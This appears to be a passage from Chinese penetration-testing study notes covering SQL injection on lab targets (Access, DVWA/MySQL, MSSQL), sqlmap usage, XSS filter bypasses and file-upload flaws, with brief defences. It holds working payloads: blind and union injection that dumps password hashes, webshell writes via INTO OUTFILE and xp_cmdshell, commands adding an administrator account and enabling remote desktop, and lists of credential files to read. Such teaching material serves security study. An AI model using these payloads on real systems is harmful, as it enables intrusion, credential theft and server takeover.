<p><a href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 len(user_name) from administrator)&gt;2  &#x2F;&#x2F;正常</p>
<p><a href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 len(user_name) from administrator)&gt;4  &#x2F;&#x2F;正常</p>
<p><a href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 len(user_name) from administrator)&gt;5  &#x2F;&#x2F;报错</p>
<p><img src="/img/oldboy/1-21.png"></p>
<h5 id="猜解字段内容"><a href="#猜解字段内容" class="headerlink" title="猜解字段内容"></a>猜解字段内容</h5><p>现在猜解字段内容并提交。</p>
<p><a href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 asc(mid(user_name,1,1)) from administrator)&gt;0  &#x2F;&#x2F;返回正常页面</p>
<p>说明ASCII值大于0 ,字段值应该为字母，如果是小于0那么说明是汉字，下面我们继续猜解。</p>
<p><a href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 asc(mid(user_name,1,1)) from administrator)&gt;500  &#x2F;&#x2F;返回错误页面</p>
<p>说明字段对应的ASCll值在0和500之间。继续提交。</p>
<p><a href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 asc(mid(user_name,1,1)) from administrator)&gt;100  &#x2F;&#x2F;返回错误页面</p>
<p>说明字段对应的ASCll值在0和100之间。继续提交。</p>
<p><a href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 asc(mid(user_name,1,1)) from administrator)&gt;90  &#x2F;&#x2F;返回正常页面</p>
<p>说明字段对应的ASCll值在90和100之间。继续提交。</p>
<p><a href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 asc(mid(user_name,1,1)) from administrator)&gt;96  &#x2F;&#x2F;返回正常页面</p>
<p>说明字段对应的ASCll值在96和100之间。继续提交。</p>
<p><a href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 asc(mid(user_name,1,1)) from administrator)&gt;97  &#x2F;&#x2F;返回错误页面</p>
<p>说明administrator表中的user_name字段的第一位ASCII值为97。通过反查ASCII值对应的字母，得到字符值为“a”接着第二位查询。</p>
<p><img src="/img/oldboy/1-22.png"></p>
<p><a href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 asc(mid(user_name,2,1)) from administrator)&gt;99  &#x2F;&#x2F;返回正常页面(注：查第二个字母的时候记得把user_name后面的1变成2)</p>
<p><a href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 asc(mid(user_name,2,1)) from administrator)&gt;100  &#x2F;&#x2F;返回错误页面</p>
<p>用同样的方法，可猜解user_name字段值和password值,最终得到如下结果:</p>
<p><img src="/img/oldboy/1-23.png"></p>
<h5 id="获取后台系统"><a href="#获取后台系统" class="headerlink" title="获取后台系统"></a>获取后台系统</h5><p>得到管理员用户名和密码后，登录后台:<a href="http://192.168.1.55:901/admin/index.asp%EF%BC%8C%E8%BE%93%E5%85%A5%E7%8C%9C%E8%A7%A3%E5%87%BA%E6%9D%A5%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81.%E5%B0%B1%E5%8F%AF%E4%BB%A5%E6%88%90%E5%8A%9F%E8%BF%9B%E5%85%A5%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E9%A1%B5%E9%9D%A2%E3%80%82">http://192.168.1.55:901/admin/index.asp，输入猜解出来的用户名和密码.就可以成功进入网站后台页面。</a></p>
<p>&#x3D;&#x3D;小提示: access数据库都是存放在网站目录下，后缀格式为mdb，asp，asa,可以通过一些暴库手段、目录猜解等直接下载数据库，如果是MSSQL、MYSQL等，一般数据库是存储在数据库安装路径下，后缀格式为myi，myd，frm，mdf 不能通过下载得到库。除非走狗屎运，对方管理员把网站库备份在网站目录下。&#x3D;&#x3D;</p>
<h3 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h3><p>基础知识一：<br>mysql4：没有information_schema库信息，因此需要获取库名、表名、字段名时，只能靠猜<br>mysql5：拥有information_schema库信息，因此可以轻松获取库名、表名、字段名<br>基础知识二：<br>mysql中root用户是最高权限用户；<br>mysql中保存用户信息的库是mysql库，对应表user表；<br>等到用户密码信息，可以进行反向破解，最终获取用户名和密码，可以远程登录数据库<br>ps：数据库8.0之后，密码的加密方式换了（sha2 早期mysql_native_password），不能用传统破解方式获取明文密码</p>
<h4 id="Mysql实战案例"><a href="#Mysql实战案例" class="headerlink" title="Mysql实战案例"></a>Mysql实战案例</h4><p>典型页面：<a href="http://192.168.138.130:90/dvwa/vulnerabilities/sqli/">http://192.168.138.130:90/dvwa/vulnerabilities/sqli/</a></p>
<h5 id="检查注入点"><a href="#检查注入点" class="headerlink" title="检查注入点"></a>检查注入点</h5><p>在搜索框中输入：1’ or 71&#x3D;1</p>
<p><img src="/img/oldboy/1-25.png"></p>
<p>存在注入点</p>
<h5 id="判断查询字段数"><a href="#判断查询字段数" class="headerlink" title="判断查询字段数"></a>判断查询字段数</h5><p><a href="http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1%5C%27+order+by+1%5C%23&Submit=Submit#">http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1\%27+order+by+1\%23&amp;Submit=Submit#</a></p>
<p>1’ order by 1#</p>
<p>发现没有报错说明字段数&gt;1</p>
<p><a href="http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1%5C%27+order+by+2%5C%23&Submit=Submit#">http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1\%27+order+by+2\%23&amp;Submit=Submit#</a></p>
<p>1’  order by 2#</p>
<p>发现没有报错说明字段数&gt;2</p>
<p><a href="http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1%5C%27++order+by+3%5C%23&Submit=Submit#">http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1\%27++order+by+3\%23&amp;Submit=Submit#</a></p>
<p>1’  order by 3#</p>
<p>页面报错：Unknown column ‘3’ in ‘order clause’</p>
<p>证明：查询的字段数为2</p>
<h5 id="获取网站业务数据库名称"><a href="#获取网站业务数据库名称" class="headerlink" title="获取网站业务数据库名称"></a>获取网站业务数据库名称</h5><p>查看当前的数据库和用户：</p>
<p><a href="http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1%5C%27+union+select+user%5C(%5C)%5C,database%5C(%5C)%5C%23&Submit=Submit#">http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1\%27+union+select+user\%28\%29\%2Cdatabase\%28\%29\%23&amp;Submit=Submit#</a></p>
<p>1’ union select user(),database()#</p>
<p>结果为：</p>
<p><img src="/img/oldboy/1-26.png"></p>
<p>获取数据库信息</p>
<p><a href="http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1%5C%27union+select+1%5C,group_concat%5C(schema_name%5C)+from+information_schema.schemata%5C%23&Submit=Submit#">http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1\%27union+select+1\%2Cgroup_concat\%28schema_name\%29+from+information_schema.schemata\%23&amp;Submit=Submit#</a></p>
<p>1’union select 1,group_concat(schema_name) from information_schema.schemata#</p>
<p><img src="/img/oldboy/1-27.png"></p>
<p>concat()和group_concat()区别：</p>
<ul>
<li><code>CONCAT()</code> 用于将多个字符串或列值连接成一个字符串，适用于单行操作。</li>
<li><code>GROUP_CONCAT()</code> 用于将分组中的多行值连接成一个字符串，适用于多行操作，并且支持去重、排序和自定义分隔符。</li>
</ul>
<h5 id="获取dvwa表名"><a href="#获取dvwa表名" class="headerlink" title="获取dvwa表名"></a>获取dvwa表名</h5><p>获取表名：</p>
<p><a href="http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1%5C%27union+select+1%5C,group_concat%5C(table_name%5C)+from+information_schema.tables+where+table_schema%5C=database%5C(%5C)%5C%23&Submit=Submit#">http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=1\%27union+select+1\%2Cgroup_concat\%28table_name\%29+from+information_schema.tables+where+table_schema\%3Ddatabase\%28\%29\%23&amp;Submit=Submit#</a></p>
<p>1’union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#</p>
<p><img src="/img/oldboy/1-28.png"></p>
<h5 id="获取表里的字段值"><a href="#获取表里的字段值" class="headerlink" title="获取表里的字段值"></a>获取表里的字段值</h5><p>获取表里的字段值</p>
<p>1’ union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;0x7573657273 #</p>
<p>table_name&#x3D;0x7573657273 使用十六进制编码的原因是：table_name&#x3D;users会报错</p>
<p><img src="/img/oldboy/1-29.png"></p>
<h5 id="获取字段内容"><a href="#获取字段内容" class="headerlink" title="获取字段内容"></a>获取字段内容</h5><p>获取字段内容</p>
<p><a href="http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=++++1%5C%27+union+select+1%5C,group_concat%5C(user_id%5C,0x7c%5C,first_name%5C,0x7c%5C,last_name%5C,0x7c%5C,user%5C,0x7c%5C,password%5C,0x7c%5C,avatar%5C,0x7c%5C)+from+users%5C%23&Submit=Submit#">http://192.168.138.130:90/dvwa/vulnerabilities/sqli/?id=++++1\%27+union+select+1\%2Cgroup_concat\%28user_id\%2C0x7c\%2Cfirst_name\%2C0x7c\%2Clast_name\%2C0x7c\%2Cuser\%2C0x7c\%2Cpassword\%2C0x7c\%2Cavatar\%2C0x7c\%29+from+users\%23&amp;Submit=Submit#</a></p>
<p>​    1’ union select 1,group_concat(user_id,0x7c,first_name,0x7c,last_name,0x7c,user,0x7c,password,0x7c,avatar,0x7c) from users#</p>
<p>结果：</p>
<p>1|admin|admin|admin|5f4dcc3b5aa765d61d8327deb882cf99|&#x2F;hackable&#x2F;users&#x2F;admin.jpg|,</p>
<p>2|Gordon|Brown|gordonb|e99a18c428cb38d5f260853678922e03|&#x2F;hackable&#x2F;users&#x2F;gordonb.jpg|,</p>
<p>3|Hack|Me|1337|8d3533d75ae2c3966d7e0d4fcc69216b|&#x2F;hackable&#x2F;users&#x2F;1337.jpg|,</p>
<p>4|Pablo|Picasso|pablo|0d107d09f5bbe40cade3de5c71e9e9b7|&#x2F;hackable&#x2F;users&#x2F;pablo.jpg|,</p>
<p>5|Bob|Smith|smithy|5</p>
<h5 id="进一步渗透"><a href="#进一步渗透" class="headerlink" title="进一步渗透"></a>进一步渗透</h5><p>前提条件：</p>
<ul>
<li>需要知道远程Web目录</li>
<li>需要mysql root权限</li>
<li>需要远程目录有写权限</li>
<li>需要数据库开启secure_file_priv 相当于secure_file_priv的值为空，不为空不充许写入webshell （默认不开启，需要修改mysql.ini配置文件）</li>
</ul>
<p>获取web路径方法</p>
<p>%27%20union%20select%201,load_file(0x433A5C5C57494E444F57535C5C73797374656D33325C5C696E65747372765C5C4D657461426173652E786D6C)+–+&amp;Submit&#x3D;Submit  路径记得转化为十六进制</p>
<p>0x433A5C5C57494E444F57535C5C73797374656D33325C5C696E65747372765C5C4D657461426173652E786D6C</p>
<p>&#x3D;C:\WINDOWS\system32\inetsrv\MetaBase.xml</p>
<p>常见Windows下的配置文件</p>
<ol>
<li>c:&#x2F;windows&#x2F;php.ini &#x2F;&#x2F;php配置信息</li>
<li>c:&#x2F;windows&#x2F;my.ini &#x2F;&#x2F;MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码</li>
<li>c:\mysql\data\mysql\user.MYD &#x2F;&#x2F;存储了mysql.user表中的数据库连接密码</li>
<li>c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置</li>
<li>d:\APACHE\Apache2\conf\httpd.conf </li>
<li>c:\windows\repair\sam &#x2F;&#x2F;存储了WINDOWS系统初次安装的密码</li>
</ol>
<p>常见Linux下的配置文件</p>
<ol>
<li>&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;apache2缺省配置文件 </li>
<li>&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhosts.conf &#x2F;&#x2F;虚拟网站设置 </li>
<li>&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F;PHP相关设置 </li>
<li>&#x2F;etc&#x2F;sysconfig&#x2F;iptables &#x2F;&#x2F;从中得到防火墙规则策略</li>
<li>&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; apache配置文件 </li>
<li>&#x2F;etc&#x2F;rsyncd.conf &#x2F;&#x2F;同步程序配置文件</li>
<li>&#x2F;etc&#x2F;my.cnf &#x2F;&#x2F;mysql的配置文件</li>
<li>&#x2F;etc&#x2F;redhat-release &#x2F;&#x2F;系统版本</li>
<li>&#x2F;usr&#x2F;local&#x2F;resin-3.0.22&#x2F;conf&#x2F;resin.conf 针对3.0.22的RESIN配置文件查看</li>
</ol>
<p>服务器读取文件：</p>
<p>union select 1,load_file(‘c:\boot.ini’) #</p>
<p>写webshell获取权限：</p>
<p>union select “<?php @eval($_POST['123']);?>“,2 into outfile “C:\phpStudy\WWW\123.php”#</p>
<h3 id="MsSQL"><a href="#MsSQL" class="headerlink" title="MsSQL"></a>MsSQL</h3><p>数据库用户信息：</p>
<ul>
<li>_sa<ul>
<li>数据库服务中权限最高的用户，同时此用户还可以对系统进行管理操作</li>
</ul>
</li>
<li>_dbowner<ul>
<li>可以编写webshell</li>
</ul>
</li>
<li>_public<ul>
<li>只能查询数据库中数据库信息、</li>
</ul>
</li>
</ul>
<p>典型网站：192.168.138.130:85&#x2F;sqlserver&#x2F;1.aspx？xxser&#x3D;</p>
<h4 id="SA用户攻击方式"><a href="#SA用户攻击方式" class="headerlink" title="_SA用户攻击方式"></a>_SA用户攻击方式</h4><p><strong>1、SQL注入检查服务类型</strong></p>
<p>​	2 and exists(select * from sysobjects)</p>
<p>​	执行成功-确认为MsSQL数据库</p>
<p><strong>2、SQL注入检查当前用户</strong></p>
<p>​	确认用户名称信息：</p>
<p>​		and system_user&#x3D;0		通过IE报错页面获取用户名(推荐低版本IE浏览器)</p>
<p>​	是否具有特权权限</p>
<p>​		and 1&#x3D;(select IS_SRVROLEMEMBER(‘sysadmin’))	检查注入位置是否具有sa权限(无报错，有报错选择其他用户)</p>
<p><strong>3、SQL确认存储过程功能</strong></p>
<p>​	（判断xp_cmdshell）只有激活了存储过程功能，才能使数据库管理员操作系统</p>
<p>​	and 1&#x3D;(select count(*) from master.dbo.sysobjects where name&#x3D;’xp_cmdshell’)	执行没报错-功能处于激活状态</p>
<p>​	EXEC sp_configure ‘show advanced options’, 1;  RECONFIGURE;  EXEC sp_configure ‘xp_cmdshell’, 1;  RECONFIGURE;–</p>
<p>​	——-激活存储过程功能</p>
<p><strong>4、系统操作命令</strong></p>
<p>​	添加用户账号(系统用户创建)：;exec master..xp_cmdshell ‘net user test test &#x2F;add’		</p>
<p>​	划分用户到管理组：;exec master..xp_cmdshell ‘net localgroup administrators test &#x2F;add’</p>
<p>​	启动3389远程功能：exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEM\CurrentControlSet\Control\Terminal Server’,’ fDenyTSConnections’,’REG_DWORD’,0;</p>
<h4 id="dbowner用户攻击方式"><a href="#dbowner用户攻击方式" class="headerlink" title="_dbowner用户攻击方式"></a>_dbowner用户攻击方式</h4><p><strong>1、SQL注入检查当前用户</strong></p>
<p>​	确认用户名称信息：and 1&#x3D;(SELECT IS_MEMBER(‘db_owner’));–		判断当前用户是否为db_owner权限</p>
<p> <strong>2、SQL注入获取网站路径</strong></p>
<p>​	①通过报错信息</p>
<p>​	②通过搜索引擎（百度、谷歌）</p>
<p>​	③通过相关语句</p>
<p>​		;drop table black;create Table black(result varchar(7996) null,id int not null identity(1,1))–</p>
<p>​		;insert into black exec master..xp_cmdshell ‘dir &#x2F;s c:\1.aspx’–</p>
<p>​		and (select result from black where id&#x3D;4)&gt;0 –</p>
<p>3、SQL注入木马文件</p>
<p>​		%20;exec%20master..xp_cmdshell%20’Echo%20”&lt;%@ Page Language&#x3D;”Jscript”%&gt;&lt;%eval(Request.Item[“123”],”unsafe”);%&gt;&gt;”%20c:\wwwtest\iis-xxser.com–wwwroot\sqlserver\muma.aspx’–</p>
<p>dir &#x2F;s c:\1.aspx：搜索1.aspx的路径，因为注入的地址就是1.aspx</p>
<p>使用webshell工具链接即可</p>
<h4 id="public用户攻击方式"><a href="#public用户攻击方式" class="headerlink" title="_public用户攻击方式"></a>_public用户攻击方式</h4><p>and 1&#x3D;(SELECT IS_MEMBER(‘db_owner’));–  	报错，说明是_public，只能进行脱裤操作</p>
<p><strong>1、确认数据库名称信息</strong></p>
<p>​	业务数据库确认</p>
<p>​	and db_name()&#x3D;0–</p>
<p>​	获取mssql所有数据库名和路径</p>
<p>​	%20and%200&#x3D;(select%20top%202%20cast([name]%20as%20nvarchar(256))%2bchar(94)%2bcast([filename]%20as%20nvarchar(256))%20from%20(select%20top%202%20dbid,name,filename%20from%20[master].[dbo].[sysdatabases]%20order%20by%20[dbid])%20t%20order%20by%20[dbid]%20desc)–</p>
<p>&#x3D;&#x3D; and 0&#x3D;(select top 2 cast([name] as nvarchar(256))+char(94)+cast([filename] as nvarchar(256)) from (select top 2 dbid,name,filename from [master].[dbo].[sysdatabases] order by [dbid]) t order by [dbid] desc)–</p>
<p><strong>2、确认数据库表名称信息</strong></p>
<p>​	获取当前数据库所有表名</p>
<p>​	and 0&lt;&gt;(select top 1 name from testdb.dbo.sysobjects where xtype&#x3D;0x7500 and name not in (select top 2 name from testdb.dbo.sysobjects where xtype&#x3D;0x7500))–</p>
<p><strong>3、确认数据表字段信息</strong></p>
<p>爆表名及字段名</p>
<p>​	爆出表中第一个字段：having 1&#x3D;1–</p>
<p>​	爆出表中第二个字段：group by admin.id having 1&#x3D;1–</p>
<p>​	爆出表中第三个字段：group by admin.id,admin.name having 1&#x3D;1–</p>
<p>4、获取数据信息</p>
<p><code>/**/and/**/(select/**/top/**/1/**/isnull(cast([id]/**/as/**/nvarchar(4000)),char(32))\%2bchar(94)\%2bisnull(cast([name]/**/as/**/nvarchar(4000)),char(32))\%2bchar(94)\%2bisnull(cast([password]/**/as/**/nvarchar(4000)),char(32))/**/from/**/[testdb]..[admin]/**/where/**/1=1/**/and/**/id/**/not/**/in/**/(select/**/top/**/0/**/id/**/from/**/[testdb]..[admin]/**/where/**/1=1/**/group/**/by/**/id))\%3E0/**/and/**/1=1</code></p>
<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>1、使用函数过滤，对敏感字符进行过滤</p>
<p>2、使用预编译和绑定变量</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">String <span class="keyword">sql</span><span class="operator">=</span>&quot;select id,no from user where id=?&quot;;</span><br><span class="line">    Preparedstatement ps<span class="operator">=</span>conn.preparestatement(<span class="keyword">sql</span>);</span><br><span class="line">    ps.setInt(<span class="number">1</span>,id);</span><br><span class="line">    ps.executeQuery();</span><br></pre></td></tr></table></figure>

<p>通过prepare预编译函数会预先编译好,也就是SQL引I擎会预先进行语法分析，产生语法树，生成执行计划，也就是说，后面你输入的参数，无论你输入的是时么，都不会影响该sql语句的语法结构了。<strong>只会被当做字符串字面值参数</strong></p>
<p>3、使用WAF防火墙开启防SQL注入</p>
<p>4、直接下载相关防范注入文件，通过incloud包含放在网站配置文件里面</p>
<h2 id="SQL注入工具"><a href="#SQL注入工具" class="headerlink" title="SQL注入工具"></a>SQL注入工具</h2><h3 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h3><p>项目地址：<a href="https://github.com/sqlmapproject/sqlmap">sqlmapproject&#x2F;sqlmap: Automatic SQL injection and database takeover tool</a></p>
<p><strong>SqlMap常用参数</strong></p>
<p>1、判断测试点</p>
<p>​	-r 指定注入参数（需要将请求头信息存储在指定文件，注意：复制请求同用crtl+a再复制）<br>​		python sqlmap.py -r get.txt<br>​	<br>​	-u get方法注入，使用时需要加入注入的参数信息<br>​		python sqlmap.py -u <a href="http://www.example.com/index.php?id=1">http://www.example.com/index.php?id=1</a><br>​	<br>​	–level&#x3D;LEVEL	执行测试的等级（1-5，默认为1）,使用–level参数且数值&gt;&#x3D;2的时候也会检查cookie里面的参数，当&gt;&#x3D;3的时候将检查User-agent和Referer。<br>​		python sqlmap.py -u <a href="http://www.example.com/index.php?id=1">http://www.example.com/index.php?id=1</a> –level&#x3D;2<br>​	<br>​	–risk&#x3D;RISK		 执行测试的风险（0-3，默认为1）,默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。<br>​		python sqlmap.py -u <a href="http://www.example.com/index.php?id=1">http://www.example.com/index.php?id=1</a> –risk&#x3D;3<br>​	<br>​	-v 				ERBOSE信息级别: 0-6 （缺省1），其值具体含义：“0”只显示python错误以及严重的信息；1同时显示基本信息和警告信息（默认）；“2”同时显示debug信息；“3”同时显示注入的payload；“4”同时显示HTTP请	求；“5”同时显示HTTP响应头；“6”同时显示HTTP响应页面；如果想看到sqlmap发送的测试payload最好的等级就是3。<br>​		python sqlmap.py -u <a href="http://www.example.com/index.php?id=1">http://www.example.com/index.php?id=1</a> -v 3<br>​	<br>​	-p 				后面接参数，针对单个参数注入<br>​		python sqlmap.py -u <a href="http://www.example.com/index.php?id=1&name=ews">http://www.example.com/index.php?id=1&amp;name=ews</a> -p id<br>​	<br>​	–threads		线程数，默认为10</p>
<p>​	-batch-smart	只能判断测试（推荐）<br>​		python sqlmap.py -u <a href="http://www.example.com/index.php?id=1">http://www.example.com/index.php?id=1</a> -batch-smart<br>​	<br>​	–mobile		模拟测试手机环境站点 </p>
<p>​	-m 				批量注入，在指定文件内输入多个目标<br>​		python sqlmap.py -m test.txt -batch-smart</p>
<p>2、获取数据</p>
<p>获取相关信息命令：</p>
<ul>
<li>​	–dbs  &#x2F;&#x2F;默认情况系sqlmap会自动的探测web应用后端的数据库类型：MySQL、Oracle、PostgreSQL、MicrosoftSQL Server、Microsoft Access、SQLite、Firebird、Sybase、SAPMaxDB、DB2 </li>
<li>​	–current-user：大多数数据库中可检测到数据库管理系统当前用户 </li>
<li>​	–current-db：当前连接数据库名 </li>
<li>​	–is-dba：判断当前的用户是否为管理 </li>
<li>​	–users：列出数据库所有所有用户</li>
</ul>
<p>获取表名				–tables -D 数据库名</p>
<p>获取字段名			    –columns -T user -D abc</p>
<p>获取数据内容			-T user -C username,password,email –dump</p>
<p>3、特殊命令</p>
<p>读取文件内容			–file-read &#x2F;etc&#x2F;password</p>
<p>系统交互的shell		    –os-shell</p>
<p>写webshell			     –file-write  “c:&#x2F;3.txt” –file-dest “C:&#x2F;phpStudy&#x2F;WWW&#x2F;3.php” -v1     </p>
<p>sqlmap过waf			 –tamper “[模块名]”					–存储在tamper目录下</p>
<p> [sqlmap绕过过滤的 tamper 脚本分类汇总.xlsx](sqlmap绕过过滤的 tamper 脚本分类汇总.xlsx) </p>
<h1 id="XSS跨站脚本攻击"><a href="#XSS跨站脚本攻击" class="headerlink" title="XSS跨站脚本攻击"></a>XSS跨站脚本攻击</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>XSS全称（Cross Site Scripting）跨站脚本攻击，XSS是指攻击者在网页中嵌入客户端脚本，通常是JavaScript编写的危险代码，当用户使用浏览器浏览网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的。</p>
<p>漏洞出现原因：</p>
<p>​	程序对用户的输入没有进行严格的限制，导致恶意脚本在服务器前端有效代码解析执行从而产生危害</p>
<p>同源策略：</p>
<p>​	为了安全考虑，所有浏览器都约定了“同源策略”，同源策略禁止页面加载或执行与自身来源不同的域的任何脚本，既不同域之间不能使用JS进行操作。比如：x.com域名下的js不能操作y.com域名下的对象</p>
<p>那么为什么要有同源策略？ 比如一个恶意网站的页面通过js嵌入了银行的登录页面（二者不同源），如果没有同源限制，恶意网页上的javascript脚本就可以在用户登录银行的时候获取用户名和密码。</p>
<p>Tips:下面这些标签跨域加载资源(资源类型是有限止的)是不受同源策略限制的</p>
<script src="...">  //加载本地js执行
<img src="...">  //图片
<link href="...">  //css
<iframe src="...">  //任意资源
同源策略修改

D:\phpStudy\WWW\pikachu\pkxss\rkeypress\rkserver.php
   同之前的案例到后台设置好Access-Control-Allow-Origin，设置为*，既允许所有人访问。



## 攻击类型

### 反射型XSS

**中危漏洞**

交互的数据一般不会被存在在数据库里面,只是简单的把用户输入的数据反射给浏览器，一次性，所见即所得。 







### 存储型XSS

**高危漏洞**

交互的数据会被存在在数据库里面,永久性存储,具有很强的稳定性。





### DOM型XSS



**低危漏洞**

不与后台服务器产生数据交互,通过前端的dom节点形成的XSS漏洞。

什么是DOM:DOM全称是Document Object Model，也就是文档对象模型。我们可以将DOM理解为，一个与系统平台和编程语言无关的接口，程序和脚本可以通过这个接口动态地访问和修改文档内容、结构和样式。当创建好一个页面并加载到浏览器时，DOM就悄然而生，它会把网页文档转换为一个文档对象，主要功能是处理网页内容。故可以使用 Javascript 语言来操作DOM以达到网页的目的。



## 攻击发现

XSS漏洞注入点：（植入js代码）

- HTML context
- Attribute Context
- URL Context
- Style Context
- Script Context









## 测试方法

1、工具扫描：APPscan、AWVS 

2、手工测试：Burpsuite、firefox(hackbar)、XSSER XSSF
    使用手工检测Web应用程序是否存在XSS漏洞时，最重要的是考虑那里有输入，输入的数据在什么地方输出。在进行手工检测XSS时，人毕竟不像软件那样不知疲惫，所以一定要选择有特殊意义的字符，这样可以快速测试是否存在XSS。

（1）在目标站点上找到输入点,比如查询接口,留言板等;
（2）输入一组"特殊字符+唯一识别字符",点击提交后,查看返回的源码,是否有做对应的处理;
（3）通过搜索定位到唯一字符,结合唯一字符前后语法确认是否可以构造执行js的条件(构造闭合);提交构造的脚本代码,看是否可以成功执行,如果成功执行则说明存在XSS漏洞;







## 漏洞防御

**防御方法01：前端表单限制**
    绕过方式01：修改前端页面代码
    绕过方法02：利用bp修改请求字段信息

**防御方法02：匹配字段信息做过滤（输入）**
\$message=preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/', '', \$_GET['message']); 
\$message=preg_replace('/\<script>/i', '', $\_GET['message']); 

​	绕过方法01：字母大小混合绕过
​		123'">\<SCRIPT>alert(123)\</SCRIPT>
<p>​	绕过方法02：字符信息拼凑绕过<br>​		&lt;sc&lt;script&gt;ript&gt;alert(‘63252’)&lt;&#x2F;scr&lt;script&gt;ipt&gt;<br>​	绕过方法03：注释干扰后台绕过<br>​		&lt;sc&lt;!–test–&gt;ript&gt;alert(‘63252’)&lt;&#x2F;scr&lt;!–tshauie–&gt;ipt&gt;<br>​	绕过方法04：代码信息编码绕过</p>
<p>​	&lt;SCRIPT&gt;alert(123)&lt;&#x2F;SCRIPT&gt; – 编码处理 base64  url</p>
<p>​	例：使用事件属性<br>​		\img src&#x3D;# onerror&#x3D;”alert(‘oldboy’)”&#x2F;&gt;<br>​		&lt;img src&#x3D;x onerror&#x3D;”&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#121;&#97;&#110;&#103;&#115;&#104;&#117;&#97;&#110;&#103;&#39;&#41;”&#x2F;&gt;<br>​	使用HTML进行编码<br>​	绕过方法05：更换代码标签绕过<br>​		&lt;img src&#x3D;# onerror&#x3D;”alert(‘oldboy’)”&#x2F;&gt;</p>
<p><strong>防御方法03：利用php函数进行防御（htmlspecialchars()）</strong><br>    绕过方法01：加载不关注引号的攻击代码信息<br>        q’ onclick&#x3D;’alert(111)’</p>
<p><strong>防御方法04：构建js代码格式进行防御</strong><br>绕过方法01：<br>‘11’&lt;&#x2F;script&gt;&lt;script&gt;alert(1111)&lt;&#x2F;script&gt;</p>
<p><a href="https://www.fujieace.com/penetration-test/xss-100.html">XSS攻击绕过过滤方法大全（约100种） - 付杰博客</a></p>
<p>总结：<br>防御：考虑各种绕过情况，一般是需要在输入和输出环节，对传入的字段信息都做处理<br>绕过：需要根据php页面防御代码信息，实现有效绕过</p>
<h1 id="文件上传下载漏洞"><a href="#文件上传下载漏洞" class="headerlink" title="文件上传下载漏洞"></a>文件上传下载漏洞</h1><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>大多数网站都有文件上传的接口，但如果在后台开发时并没有对上传的文件进行安全考虑或采用了有缺陷的措施，导致攻击者可以通过一些手段绕过安全措施从而上传一些恶意文件，从而通过该恶意文件的访问来控制整个后台</p>
<h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><img src="/img/oldboy/image-20250304160544834.png" alt="image-20250304160544834" style="zoom: 80\%;" />



<p>在验证上传点是否存在漏洞时，直接上传普通文件，文件名发生了改变极大可能为白名单绕过</p>
<p><img src="/img/oldboy/image-20250304221013611.png" alt="image-20250304221013611"></p>
